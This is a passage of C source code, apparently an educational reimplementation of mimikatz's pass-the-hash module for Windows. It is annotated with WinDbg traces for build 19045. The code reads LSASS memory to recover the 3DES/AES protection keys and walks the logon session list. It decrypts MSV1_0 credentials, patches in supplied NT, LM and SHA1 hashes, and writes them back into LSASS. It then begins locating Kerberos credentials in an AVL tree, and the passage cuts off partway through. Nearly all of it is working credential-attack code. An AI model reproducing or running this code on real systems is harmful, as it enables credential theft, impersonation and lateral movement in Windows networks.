                               &dwSizeNeeded, 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptGetProperty 3DES failed with error code : %ld\n", status);

    pKey->pKey = LocalAlloc(LPTR, pKey->cbKey);
}

// Setup key structure for AES key.
// Based on kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
VOID InitLsaCryptoKeyAes(OUT PKIWI_BCRYPT_GEN_KEY pKey)
{
    NTSTATUS status = BCryptOpenAlgorithmProvider(&pKey->hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptOpenAlgorithmProvider AES failed with error code : %ld\n", status);

    status = BCryptSetProperty(pKey->hProvider, BCRYPT_CHAINING_MODE, (LPBYTE)BCRYPT_CHAIN_MODE_CFB,
                               sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptSetProperty AES failed with error code : %ld\n", status);

    ULONG dwSizeNeeded = 0;
    status = BCryptGetProperty(pKey->hProvider, BCRYPT_OBJECT_LENGTH, (LPBYTE)&pKey->cbKey, sizeof(pKey->cbKey),
                               &dwSizeNeeded, 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptGetProperty AES failed with error code : %ld\n", status);

    pKey->pKey = LocalAlloc(LPTR, pKey->cbKey);
}

// Based on kuhl_m_sekurlsa_nt6_acquireKey in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
// hLsass: Handle to LSASS process
// pTemplate: describes offsets / structure layout of relevant credentials in LSASS memory
// offsetToKeyPtr: varies depending on 3DES / AES key
// pLsaKeyStructure: pointer to structure of relevant credentials in LSASS memory
VOID AcquireLsaCryptoMaterialKey(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE pTemplate, LONG offsetToKeyPtr,
                                 IN LPBYTE pLsaKeyStructure, OUT PKIWI_BCRYPT_GEN_KEY pKiwiBcryptGenKey)
{
    // example run for build 19045: WinDbg output in lsasrv.dll in lsass.exe for extracting 3des key
    //
    // 0: kd> dd 00007fff`887b6789-0n89 l1
    // 00007fff`887b6730  00131fb4
    //
    // 0: kd> ln 00007fff`887b6789-0n89+4+00131fb4
    // (00007fff`888e86e8)   lsasrv!h3DesKey   |  (00007fff`888e86f0)   lsasrv!hAesProvider
    //
    // 0: kd> db poi(00007fff`887b6789-0n89+4+00131fb4)
    // 00000231`01dc0000  20 00 00 00 52 55 55 55-70 80 e4 01 31 02 00 00   ...RUUUp...1...
    // 00000231`01dc0010  20 00 dc 01 31 02 00 00-00 00 00 00 00 00 00 00   ...1...........
    // 00000231`01dc0020  0e 02 00 00 4b 53 53 4d-05 00 01 00 01 00 00 00  ....KSSM........
    // 00000231`01dc0030  08 00 00 00 08 00 00 00-a8 00 00 00 00 00 00 00  ................
    // 00000231`01dc0040  b0 59 e5 01 31 02 00 00-e4 c3 70 9b 19 4d 9d 80  .Y..1.....p..M..
    //                                                        \/ key starts here at df
    // 00000231`01dc0050  00 00 00 00 00 00 00 00-18 00 00 00 df be 06 0a  ................
    // 00000231`01dc0060  cf e8 27 57 04 99 33 e1-e3 97 82 11 4b e0 fa 24  ..'W..3.....K..$
    // 00000231`01dc0070  21 06 90 67 00 00 00 00-00 00 00 00 00 00 00 00  !..g............
    //                             /\ key ends here at 67

    LONG offset = 0;
    if (!ReadProcessMemory(hLsass, pLsaKeyStructure + offsetToKeyPtr, &offset, sizeof(offset), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    LPBYTE ppLsaKiwiBcryptHandleKey = pLsaKeyStructure + offsetToKeyPtr + sizeof(offset) + offset;
    LPBYTE pLsaKiwiBcryptHandleKey = NULL;
    if (!ReadProcessMemory(hLsass, ppLsaKiwiBcryptHandleKey, &pLsaKiwiBcryptHandleKey, sizeof(pLsaKiwiBcryptHandleKey),
                           NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());
    KIWI_BCRYPT_HANDLE_KEY kiwiBcryptHandleKey = {0};
    if (!ReadProcessMemory(hLsass, pLsaKiwiBcryptHandleKey, &kiwiBcryptHandleKey, sizeof(kiwiBcryptHandleKey), NULL) ||
        kiwiBcryptHandleKey.tag != 0x55555552 /* 'UUUR' */)
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    PKIWI_BCRYPT_KEY pKiwiBcryptKey = LocalAlloc(LPTR, pTemplate->KiwiBcryptKeyLength);
    if (!ReadProcessMemory(hLsass, kiwiBcryptHandleKey.key, pKiwiBcryptKey, pTemplate->KiwiBcryptKeyLength, NULL) ||
        pKiwiBcryptKey->tag != 0x4d53534b /* 'MSSK' */)
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    LPBYTE pLsaKiwiHardKey = ((LPBYTE)kiwiBcryptHandleKey.key) + pTemplate->OffsetKiwiBcryptKeyKiwiHardKey;

    // Read size of KIWI_HARD_KEY (first struct member).
    ULONG kiwiHardKeyCbSecret = 0;
    if (!ReadProcessMemory(hLsass, pLsaKiwiHardKey, &kiwiHardKeyCbSecret, sizeof(kiwiHardKeyCbSecret), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    // Read full KIWI_HARD_KEY.
    PKIWI_HARD_KEY pKiwiHardKey = LocalAlloc(LPTR, kiwiHardKeyCbSecret);
    if (!ReadProcessMemory(hLsass, pLsaKiwiHardKey, pKiwiHardKey, sizeof(kiwiHardKeyCbSecret) + kiwiHardKeyCbSecret,
                           NULL))
        LogError("ReadProcessMemory failed with error code  : %ld\n", GetLastError());

    printf("    ... Got key at 0x%016llx : ", (DWORD64)(pLsaKiwiHardKey + FIELD_OFFSET(KIWI_HARD_KEY, data)));
    PrintBinaryAsHex(pKiwiHardKey->data, pKiwiHardKey->cbSecret);

    NTSTATUS status =
        BCryptGenerateSymmetricKey(pKiwiBcryptGenKey->hProvider, &pKiwiBcryptGenKey->hKey, pKiwiBcryptGenKey->pKey,
                                   pKiwiBcryptGenKey->cbKey, pKiwiHardKey->data, pKiwiHardKey->cbSecret, 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptGenerateSymmetricKey failed with error code : %ld\n", status);
}

// Search `dwSize` bytes of memory of `hProc` starting from `pStartAddress` for
// the pattern `pPattern` of length `dwPatternSize`. Returns the start virtual
// address where the pattern matches *in the remote process `hProc`*.
// Based on kull_m_memory_search in modules/kull_m_memory.c.
VOID SearchMemory(HANDLE hProc, LPBYTE pStartAddress, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize,
                  OUT LPBYTE *ppMatchAddress)
{
    // Since there is no function for directly comparing two memory regions in
    // different processes we first need to copy the bytes into one's own
    // process.

    // Allocate buffer in one's own process.
    LPBYTE pBuf = LocalAlloc(LPTR, dwSize);

    // Copy over the bytes from the target process.
    if (!ReadProcessMemory(hProc, pStartAddress, pBuf, dwSize, NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    // Search memory.
    for (LPBYTE pos = pBuf; pos + dwPatternSize <= pBuf + dwSize; pos++)
    {
        if (RtlEqualMemory(pos, pPattern, dwPatternSize))
        {
            *ppMatchAddress = pStartAddress + (pos - pBuf);
            break;
        }
    }

    LocalFree(pBuf);
}

// Enumerate all logon sessions. For each logon session, some information like
// luid and pointers to the credential data are gathered, and passed to the
// specified callback function. Based on kuhl_m_sekurlsa_enum.
VOID LsaEnumLogonSessions(PLSASS_CONTEXT pLsassCtx, LSA_ENUM_LOGON_SESSIONS_CALLBACK callback, LPVOID pOptionalData)
{
    // example run for build 19045: WinDbg output in lsasrv.dll in lsass.exe
    //
    // 0: kd> lm m lsasrv
    // 00007fff`88760000 00007fff`888ff000   lsasrv     (pdb symbols)
    // C:\ProgramData\Dbg\sym\lsasrv.pdb\6E70C4E5026751D0104EEBBE4B086E1C1\lsasrv.pdb
    //
    // 0: kd> s -b 00007fff`88760000 00007fff`888ff000 33 ff 41 89 37 4c 8b f3 45 85 c0 74
    // 00007fff`887cbac4  33 ff 41 89 37 4c 8b f3-45 85 c0 74 53 48 8d 35  3.A.7L..E..tSH.5
    //
    // Disassembly:
    // 00007fff`887cbabd 448b054cb21100       mov     r8d, dword ptr [lsasrv!LogonSessionListCount (7fff888e6d10)]
    // 00007fff`887cbac4 33ff                 xor     edi, edi
    // 00007fff`887cbac6 418937               mov     dword ptr [r15], esi
    // 00007fff`887cbac9 4c8bf3               mov     r14, rbx
    // 00007fff`887cbacc 4585c0               test    r8d, r8d
    // 00007fff`887cbacf 7453                 je      lsasrv!WLsaEnumerateLogonSession+0x19c (7fff887cbb24)
    // 00007fff`887cbad1 488d3528ba1100       lea     rsi, [lsasrv!LogonSessionListLock (7fff888e7500)]
    // 00007fff`887cbad8 488d0d21b81100       lea     rcx, [lsasrv!LogonSessionList (7fff888e7300)]
    //
    // 0: kd> dd 00007fff`887cbac4-4 l1
    // 00007fff`887cbac0  0011b24c
    // 0: kd> ln 00007fff`887cbac4-4+4+0011b24c
    // (00007fff`888e6d10)   lsasrv!LogonSessionListCount   |  (00007fff`888e6d18)   lsasrv!LsapCallbackInterface
    // 0: kd> dd 00007fff`887cbac4+0011b24c l1
    // 00007fff`888e6d10  00000001
    //
    // 0: kd> dd 00007fff`887cbac4+0n23 l1
    // 00007fff`887cbadb  0011b821
    // 0: kd> ln 00007fff`887cbac4+0n23+4+0011b821
    // (00007fff`888e7300)   lsasrv!LogonSessionList   |  (00007fff`888e7500)   lsasrv!LogonSessionListLock

    PLSA_ENUM_LOGON_SESSION_LIST_TEMPLATE pSessionListTemplate = GetLsaEnumLogonSessionListTemplate();
    LogInfo("Searching for the following LogonSessionList data structure pattern in lsasrv.dll : ");
    PrintBinaryAsHex(pSessionListTemplate->Pattern, pSessionListTemplate->PatternLength);

    LPBYTE pLsaPattern = NULL;
    SearchMemory(pLsassCtx->ProcInfo.Handle, pLsassCtx->LsaSrvInfo.DllBase, pLsassCtx->LsaSrvInfo.ImageSize,
                 pSessionListTemplate->Pattern, pSessionListTemplate->PatternLength, &pLsaPattern);

    LONG offset = 0;

    LPBYTE pLsaTmp1 = pLsaPattern + pSessionListTemplate->OffsetPatternToLogonSessionList;
    if (!ReadProcessMemory(pLsassCtx->ProcInfo.Handle, pLsaTmp1, &offset, sizeof(offset), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());
    PLIST_ENTRY pLsaLogonSessionList =
        (PLIST_ENTRY)(pLsaTmp1 + sizeof(offset) + offset); // doubly linked list of logon sessions
    printf("    ... lsasrv!LogonSessionList is at      0x%016llx\n", (DWORD64)pLsaLogonSessionList);

    LPBYTE pLsaTmp2 = pLsaPattern + pSessionListTemplate->OffsetPatternToLogonSessionListCount;
    if (!ReadProcessMemory(pLsassCtx->ProcInfo.Handle, pLsaTmp2, &offset, sizeof(offset), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());
    LPBYTE pLsaLogonSessionListCount = pLsaTmp2 + sizeof(offset) + offset;
    printf("    ... lsasrv!LogonSessionListCount is at 0x%016llx\n", (DWORD64)pLsaLogonSessionListCount);

    PLSA_ENUM_LOGON_SESSION_TEMPLATE pSessionTemplate =
        GetLsaEnumLogonSessionTemplate(pLsassCtx->LsaSrvInfo.TimeDateStamp);

    DWORD logonSessionListCount = 0;
    if (!ReadProcessMemory(pLsassCtx->ProcInfo.Handle, pLsaLogonSessionListCount, &logonSessionListCount,
                           sizeof(logonSessionListCount), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    for (SIZE_T i = 0; i < logonSessionListCount; i++)
    {
        // logonSessionListCount was always 1 in my tests...
        LogInfo("Enumerating all LogonSessions in the list at 0x%016llx\n", (DWORD64)&pLsaLogonSessionList[i]);

        PLIST_ENTRY pLsaFlink = NULL;
        if (!ReadProcessMemory(pLsassCtx->ProcInfo.Handle, &pLsaLogonSessionList[i], &pLsaFlink, sizeof(pLsaFlink),
                               NULL))
            LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

        LPBYTE buf = LocalAlloc(LPTR, pSessionTemplate->StructSize);

        BOOL retCallback = TRUE;

        // Iterate over the doubly linked list.
        // Conventions: https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry
        // > For a LIST_ENTRY structure that serves as a list entry, the Flink
        // > member points to the next entry in the list or to the list header if
        // > there is no next entry in the list.
        // > For a LIST_ENTRY structure that serves as the list header, the
        // > Flink member points to the first entry in the list or to the
        // > LIST_ENTRY structure itself if the list is empty.
        // If the Flink points to the list head again, we have traverse the whole list once.
        while ((pLsaFlink != &pLsaLogonSessionList[i]) && retCallback)
        {
            if (!ReadProcessMemory(pLsassCtx->ProcInfo.Handle, pLsaFlink, buf, pSessionTemplate->StructSize, NULL))
                LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

            // clang-format off
            LSA_LOGON_SESSION logonSession = {
                .Luid               = (PLUID)           (buf + pSessionTemplate->OffsetToLuid),
                .LogonType          = *((PULONG)        (buf + pSessionTemplate->OffsetToLogonType)),
                .Session            = *((PULONG)        (buf + pSessionTemplate->OffsetToSession)),
                .Username           = (PUNICODE_STRING) NULL, // copying is not implemented; (buf + pSessionTemplate->OffsetToUsername),
                .LogonDomain        = (PUNICODE_STRING) NULL, // copying is not implemented; (buf + pSessionTemplate->OffsetToLogonDomain),
                .LogonServer        = (PUNICODE_STRING) NULL, // copying is not implemented; (buf + pSessionTemplate->OffsetToLogonServer),
                .Credentials        = *(PVOID*)         (buf + pSessionTemplate->OffsetToCredentials),
                .CredentialManager  = *(PVOID*)         (buf + pSessionTemplate->OffsetToCredentialManager),
                .PSid               = *(PSID*)          (buf + pSessionTemplate->OffsetToPSid),
                .LogonTime          = *((PFILETIME)     (buf + pSessionTemplate->OffsetToLogonTime)),
            };
            // clang-format on

            // Pass data to callback.
            retCallback = callback(&logonSession, pOptionalData);

            // Continue to next entry in the doubly linked list
            // LogonSessionList.
            pLsaFlink = ((PLIST_ENTRY)buf)->Flink;
        }

        LocalFree(buf);
    }
}

// Inject credentials for MSV1_0 SSP/AP. Based on
// kuhl_m_sekurlsa_enum_callback_msv_pth in
// mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c.
// pLogonSession: logon session data (username, domain, credentials etc)
//      gathered through LogonSessionList enumeration
// pOptionalData: credential values that should be patched
BOOL CALLBACK CallbackPthMsv(IN PLSA_LOGON_SESSION pLogonSession, IN OPTIONAL LPVOID pOptionalData)
{
    PPTH_CREDS pthCreds = (PPTH_CREDS)pOptionalData;
    if (!SecEqualLuid(pLogonSession->Luid, pthCreds->Luid))
        return TRUE;

    LogInfo("Found target session with LUID 0x%lx : 0x%lx\n", pLogonSession->Luid->HighPart,
            pLogonSession->Luid->LowPart);

    // Both these structs contain the encrypted credentials.
    KIWI_MSV1_0_CREDENTIALS credentials = {0};
    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials = {0};

    PKIWI_MSV1_0_CREDENTIALS pLsaCredentials = pLogonSession->Credentials;
    while (pLsaCredentials)
    {
        if (!ReadProcessMemory(pthCreds->LsassContext->ProcInfo.Handle, pLsaCredentials, &credentials,
                               sizeof(credentials), NULL))
            LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

        PKIWI_MSV1_0_PRIMARY_CREDENTIALS pLsaPrimaryCredentials = credentials.PrimaryCredentials;
        while (pLsaPrimaryCredentials)
        {
            if (!ReadProcessMemory(pthCreds->LsassContext->ProcInfo.Handle, pLsaPrimaryCredentials, &primaryCredentials,
                                   sizeof(primaryCredentials), NULL))
                LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

            PWSTR pLsaPrimaryCredentialsBuffer =
                primaryCredentials.Credentials.Buffer; // backup pointer to buffer in LSASS address space

            ReadProcessMemoryUnicodeString(pthCreds->LsassContext->ProcInfo.Handle, &primaryCredentials.Credentials);
            ReadProcessMemoryUnicodeString(pthCreds->LsassContext->ProcInfo.Handle,
                                           (PUNICODE_STRING)&primaryCredentials.Primary);

            PthMsv(pthCreds, &primaryCredentials, pLsaPrimaryCredentialsBuffer);

            LocalFree(primaryCredentials.Credentials.Buffer);
            LocalFree(primaryCredentials.Primary.Buffer);

            pLsaPrimaryCredentials = primaryCredentials.next;
        }

        pLsaCredentials = credentials.next;
    }

    return FALSE;
}

// Swap the existing credentials with the supplied ones.
// Based on kuhl_m_sekurlsa_msv_enum_cred_callback_pth.
// pthCreds: credential values that should be patched
// pPrimaryCredentials: copy of encrypted credentials from LSASS memory
// pLsaPrimaryCredentials: original pointer of encrypted credentials in LSASS
//      memory (only needed to write back the patched credentials to the
//      correct memory location)
VOID PthMsv(PPTH_CREDS pthCreds, PKIWI_MSV1_0_PRIMARY_CREDENTIALS pPrimaryCredentials, PWSTR pLsaPrimaryCredentials)
{
    if (!RtlEqualString(&pPrimaryCredentials->Primary, &((STRING){7, 8, "Primary"}), FALSE))
        LogError("Got wrong memory part\n");

    // Encrypted credentials for MSV1_0.
    LPBYTE msvCredentials = (LPBYTE)pPrimaryCredentials->Credentials.Buffer;
    if (!msvCredentials)
        LogError("Got wrong memory part\n");

    // Decrypt credential structure to access individual struct members.
    printf("    ... Decrypting credential structure\n");
    LsaUnProtectMemory(msvCredentials, pPrimaryCredentials->Credentials.Length, pthCreds->LsaCrypto);

    // Get system-specific struct layout template for accessing the fields at
    // the correct offsets.
    PMSV1_0_PRIMARY_CREDENTIAL_TEMPLATE template = GetMsv10PrimaryCredentialTemplate();

    if (template->OffsetToIsIso)
        *((PBOOL)(msvCredentials + template->OffsetToIsIso)) = FALSE;
    if (template->OffsetToIsDPAPIProtected)
    {
        *((PBOOL)(msvCredentials + template->OffsetToIsDPAPIProtected)) = FALSE;
        RtlZeroMemory(msvCredentials + template->OffsetToDPAPIProtected, LM_NT_HASH_LENGTH);
    }

    if (pthCreds->Creds->Lmhash)
    {
        printf("    ... Patching LM hash with ");
        PrintBinaryAsHex(pthCreds->Creds->Lmhash, LM_NT_HASH_LENGTH);
        *((PBOOL)(msvCredentials + template->OffsetToIsLmOfPassword)) = TRUE;
        RtlCopyMemory(msvCredentials + template->OffsetToLmOfPassword, pthCreds->Creds->Lmhash, LM_NT_HASH_LENGTH);
    }
    else
    {
        printf("    ... Clearing LM hash\n");
        *((PBOOL)(msvCredentials + template->OffsetToIsLmOfPassword)) = FALSE;
        RtlZeroMemory(msvCredentials + template->OffsetToLmOfPassword, LM_NT_HASH_LENGTH);
    }

    if (pthCreds->Creds->Sha1hash)
    {
        printf("    ... Patching SHA1 hash with ");
        PrintBinaryAsHex(pthCreds->Creds->Sha1hash, SHA_DIGEST_LENGTH);
        *((PBOOL)(msvCredentials + template->OffsetToIsShaOfPassword)) = TRUE;
        RtlCopyMemory(msvCredentials + template->OffsetToShaOfPassword, pthCreds->Creds->Sha1hash, SHA_DIGEST_LENGTH);
    }
    else
    {
        printf("    ... Clearing SHA1 hash\n");
        *((PBOOL)(msvCredentials + template->OffsetToIsShaOfPassword)) = FALSE;
        RtlZeroMemory(msvCredentials + template->OffsetToShaOfPassword, SHA_DIGEST_LENGTH);
    }

    if (pthCreds->Creds->Nthash)
    {
        printf("    ... Patching NT hash with ");
        PrintBinaryAsHex(pthCreds->Creds->Nthash, LM_NT_HASH_LENGTH);
        *((PBOOL)(msvCredentials + template->OffsetToIsNtOfPassword)) = TRUE;
        RtlCopyMemory(msvCredentials + template->OffsetToNtOfPassword, pthCreds->Creds->Nthash, LM_NT_HASH_LENGTH);
    }
    else
    {
        printf("    ... Clearing NT hash\n");
        *((PBOOL)(msvCredentials + template->OffsetToIsNtOfPassword)) = FALSE;
        RtlZeroMemory(msvCredentials + template->OffsetToNtOfPassword, LM_NT_HASH_LENGTH);
    }

    printf("    ... Re-encrypting credential structure\n");
    LsaProtectMemory(msvCredentials, pPrimaryCredentials->Credentials.Length, pthCreds->LsaCrypto);

    printf("    ... Writing back patched credential structure to LSASS at 0x%016llx\n",
           (DWORD64)pLsaPrimaryCredentials);
    if (!WriteProcessMemory(pthCreds->LsassContext->ProcInfo.Handle, pLsaPrimaryCredentials,
                            pPrimaryCredentials->Credentials.Buffer, pPrimaryCredentials->Credentials.Length, NULL))
        LogError("WriteProcessMemory failed with error code : %ld\n", GetLastError());
}

// Inject credentials for Kerberos SSP/AP. Based on
// kuhl_m_sekurlsa_enum_callback_kerberos_pth in
// mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c.
// pLogonSession: logon session data (username, domain, credentials etc)
//      gathered through LogonSessionList enumeration
// pOptionalData: credential values that should be patched
BOOL CALLBACK CallbackPthKerberos(IN PLSA_LOGON_SESSION pLogonSession, IN OPTIONAL LPVOID pOptionalData)
{
    PPTH_CREDS pthCreds = (PPTH_CREDS)pOptionalData;
    if (!SecEqualLuid(pLogonSession->Luid, pthCreds->Luid))
        return TRUE;

    LogInfo("Found target session with LUID 0x%lx : 0x%lx in doubly-linked list LogonSessionList\n",
            pLogonSession->Luid->HighPart, pLogonSession->Luid->LowPart);

    // In contrast to MSV1_0 where we got the credentials directly from
    // enumerating the logon sessions, for Kerberos we have to traverse further
    // Kerberos-specific data structures in order to obtain the credentials
    // that we want to patch. For NT5, these were organized in a linked list
    // (see kuhl_m_sekurlsa_utils_pFromLinkedListByLuid), for the newer NT6
    // they are organized in an AVL tree (see
    // kuhl_m_sekurlsa_utils_pFromAVLByLuid). In order to keep the code
    // simpler, here we are not that backwards-compatible and implement only
    // the newer method.

    // example run for build 19045: WinDbg output in lsass.exe
    //
    // 0: kd> lm m kerberos
    // 00007ffa`d42c0000 00007ffa`d43d8000   kerberos   (pdb symbols)
    // C:\ProgramData\Dbg\sym\KERBEROS.pdb\BD7591C1EBC3CD0095323CF1F5D273111\KERBEROS.pdb
    //
    // 0: kd> s -b 00007ffa`d42c0000 00007ffa`d43d8000 48 8b 18 48 8d 0d
    // 00007ffa`d4331761  48 8b 18 48 8d 0d 15 38-09 00 48 8b d0 48 ff 15  H..H...8..H..H..
    //
    // Disassembly:
    // 00007ffa`d4331761 488b18         mov     rbx, qword ptr [rax]
    // 00007ffa`d4331764 488d0d15380900 lea     rcx, [kerberos!KerbGlobalLogonSessionTable (7ffad43c4f80)]
    // 00007ffa`d433176b 488bd0         mov     rdx, rax
    //
    // 0: kd> dd 00007ffa`d4331761+0n6 l1
    // 00007ffa`d4331767  00093815
    //
    // 0: kd> ln 00007ffa`d4331761+0n6+4+00093815
    // (00007ffa`d43c4f80)   kerberos!KerbGlobalLogonSessionTable   |  (00007ffa`d43c4fe8)   kerberos!ScavengerDeadPool

    PKERB_CREDENTIAL_TEMPLATE template = GetKerberosCredentialTemplate();

    LogInfo("Searching Kerberos credentials structure pattern for LUID in AVL tree in kerberos.dll : ");
    PrintBinaryAsHex(template->Pattern, template->PatternLength);

    // shorthands
    HANDLE hLsass = pthCreds->LsassContext->ProcInfo.Handle;
    PBASIC_MODULE_INFORMATION krbInfo = &pthCreds->LsassContext->KerberosInfo;

    LPBYTE pLsaPattern = NULL;
    SearchMemory(hLsass, krbInfo->DllBase, krbInfo->ImageSize, template->Pattern, template->PatternLength,
                 &pLsaPattern);

    // from kuhl_m_sekurlsa_utils_pFromAVLByLuid

    LONG offset = 0;
    if (!ReadProcessMemory(hLsass, pLsaPattern + template->OffsetPatternToKerberosLogonSessionTable, &offset,
                           sizeof(offset), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());
    LPBYTE pLsaKerbGlobalLogonSessionTable =
        pLsaPattern + template->OffsetPatternToKerberosLogonSessionTable + sizeof(offset) + offset;
    printf("    ... Found kerberos!KerbGlobalLogonSessionTable at 0x%016llx\n",
           (DWORD64)pLsaKerbGlobalLogonSessionTable);

    RTL_AVL_TABLE kerbGlobalLogonSessionTable = {0};
    if (!ReadProcessMemory(hLsass, pLsaKerbGlobalLogonSessionTable, &kerbGlobalLogonSessionTable,
                           sizeof(kerbGlobalLogonSessionTable), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    LPBYTE pLsaAvlNodeCred = FindKerbCredFromAvlByLuid(
        hLsass, kerbGlobalLogonSessionTable.BalancedRoot.RightChild /* root node of the tree */, template->OffsetToLuid,
        pLogonSession->Luid);

    if (!pLsaAvlNodeCred)
        LogError("Could not find relevant LUID in Kerberos credentials AVL tree\n");

    printf("    ... Found Kerberos credentials for LUID 0x%lx : 0x%lx in AVL tree at 0x%016llx\n",
           pLogonSession->Luid->HighPart, pLogonSession->Luid->LowPart, (DWORD64)pLsaAvlNodeCred);

    LPBYTE pAvlNodeCred = LocalAlloc(LPTR, template->StructSize);
    if (!ReadProcessMemory(hLsass, pLsaAvlNodeCred, pAvlNodeCred, template->StructSize, NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    PthKerberos(pthCreds, pAvlNodeCred, pLsaAvlNodeCred, template);

    return FALSE;
}

// Traverse the AVL tree until the node with the target LUID is found.
// Based on kuhl_m_sekurlsa_utils_pFromAVLByLuidRec.
// pLsaAvlTree: pointer to root node of the AVL tree in LSASS memory
// luidOffset: offset from each node to the luid associated with the current
//      AVL tree note
PVOID FindKerbCredFromAvlByLuid(HANDLE hLsass, PRTL_BALANCED_LINKS pLsaAvlTree, DWORD luidOffset, PLUID luidToFind)
{

    // example run for build 19045: WinDbg output in lsass.exe for the first step
    //
    // 0: kd> !process 0 0 lsass.exe
    // PROCESS ffff800f55bcb080
    //     SessionId: 0  Cid: 02ac    Peb: d9f699c000  ParentCid: 0210
    //     DirBase: 12c556002  ObjectTable: ffffc585e17f06c0  HandleCount: 1104.
    //     Image: lsass.exe
    //
    // 0: kd> .process /p /i ffff800f55bcb080 ; g
    // You need to continue execution (press 'g' <enter>) for the context
    // to be switched. When the debugger breaks in again, you will be in
    // the new process context.
    // Break instruction exception - code 80000003 (first chance)
    // nt!DbgBreakPointWithStatus:
    // fffff805`19005240 cc              int     3
    //
    // 0: kd> dx *(RTL_AVL_TABLE*)0x00007ffad43c4f80
    // *(RTL_AVL_TABLE*)0x00007ffad43c4f80                 [Type: RTL_AVL_TABLE]
    //     [+0x000] BalancedRoot     [Type: _RTL_BALANCED_LINKS]
    //     [+0x020] OrderedPointer   : 0x0 [Type: void *]
    //     [+0x028] WhichOrderedElement : 0x0 [Type: unsigned long]
    //     [+0x02c] NumberGenericTableElements : 0x12 [Type: unsigned long]
    //     [+0x030] DepthOfTree      : 0x5 [Type: unsigned long]
    //     [+0x038] RestartKey       : 0x0 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x040] DeleteCount      : 0x18 [Type: unsigned long]
    //     [+0x048] CompareRoutine   : 0x7ffad42d1170 :
    //     kerberos!?KerbLogonSessionTableCompare@@YA?AW4_RTL_GENERIC_COMPARE_RESULTS@@PEAU_RTL_AVL_TABLE@@PEAX1@Z+0x0
    //     [Type: _RTL_GENERIC_COMPARE_RESULTS (__cdecl*)(_RTL_AVL_TABLE *,void *,void *)]
    //     [+0x050] AllocateRoutine  : 0x7ffad42e4480 : kerberos!KerbTableAllocate+0x0 [Type: void *
    //     (__cdecl*)(_RTL_AVL_TABLE *,unsigned long)]
    //     [+0x058] FreeRoutine      : 0x7ffad42d3500 : kerberos!KerbTableFree+0x0 [Type: void (__cdecl*)(_RTL_AVL_TABLE
    //     *,void *)]
    //     [+0x060] TableContext     : 0x0 [Type: void *]
    //
    // 0: kd> dx -id 0,0,ffff800f55bcb080 -r1 (*((combase!_RTL_BALANCED_LINKS *)0x7ffad43c4f80))
    // (*((combase!_RTL_BALANCED_LINKS *)0x7ffad43c4f80))                 [Type: _RTL_BALANCED_LINKS]
    //     [+0x000] Parent           : 0x7ffad43c4f80 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x008] LeftChild        : 0x0 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x010] RightChild       : 0x28a50c67030 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x018] Balance          : 0 [Type: char]
    //     [+0x019] Reserved         [Type: unsigned char [3]]
    //
    // 0: kd> dx -id 0,0,ffff800f55bcb080 -r1 ((combase!_RTL_BALANCED_LINKS *)0x28a50c67030)
    // ((combase!_RTL_BALANCED_LINKS *)0x28a50c67030)                 : 0x28a50c67030 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x000] Parent           : 0x7ffad43c4f80 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x008] LeftChild        : 0x28a50c0d6a0 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x010] RightChild       : 0x28a50ccfe10 [Type: _RTL_BALANCED_LINKS *]
    //     [+0x018] Balance          : 1 [Type: char]
    //     [+0x019] Reserved         [Type: unsigned char [3]]
    //
    // 1: kd> dx (LUID*)(((RTL_AVL_TABLE*)0x28a50c67030)->OrderedPointer + 0n72)
    // (LUID*)(((RTL_AVL_TABLE*)0x28a50c67030)->OrderedPointer + 0n72)                 : 0x28a50c8dd88 [Type: LUID *]
    //     [+0x000] LowPart          : 0x3704bc [Type: unsigned long]
    //     [+0x004] HighPart         : 0 [Type: long]

    if (!pLsaAvlTree)
        return NULL;

    // Read current tree node metadata from LSASS' memory.
    RTL_AVL_TABLE avlTree = {0}; // RTL_BALANCED_LINKS is embedded in RTL_AVL_TABLE
    if (!ReadProcessMemory(hLsass, pLsaAvlTree, &avlTree, sizeof(avlTree), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    if (avlTree.OrderedPointer)
    {
        LUID luid = {0};
        if (!ReadProcessMemory(hLsass, ((LPBYTE)avlTree.OrderedPointer) + luidOffset, &luid, sizeof(luid), NULL))
            LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

